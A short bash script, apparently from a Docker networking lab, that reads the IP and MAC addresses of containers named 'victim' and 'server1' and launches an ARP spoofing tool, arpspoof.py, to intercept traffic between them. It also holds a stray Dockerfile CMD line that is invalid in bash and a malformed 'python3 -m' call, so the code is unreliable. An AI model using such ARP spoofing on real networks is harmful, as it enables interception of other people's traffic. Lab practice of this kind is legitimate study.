#!/bin/bash
sip=$(docker inspect victim | grep '                    "IPAddress"'| cut -d ':' -f2 | sed -e 's/"//g' | sed -e 's/,//g')
smac=$(docker inspect victim | grep '                    "MacAddress":'|cut -d ':' -f2-7 |sed -e 's/"//g' | sed -e 's/,//g')
tip=$(docker inspect server1 | grep '                    "IPAddress"'| cut -d ':' -f2 | sed -e 's/"//g' | sed -e 's/,//g')
tmac=$(docker inspect server1 | grep '                    "MacAddress":'|cut -d ':' -f2-7 |sed -e 's/"//g' | sed -e 's/,//g')
CMD [ "python", "./arpspoof.py", "-v", "-s", "192.168.42.2", "-r", "02:42:c0:a8:2a:02", "-t", "192.168.42.3", "-g", "02:42:c0:a8:2a:03"]
/usr/local/bin/python3 -m arpspoof.py -v -s $sip -r $smac -t $tip -g $tmac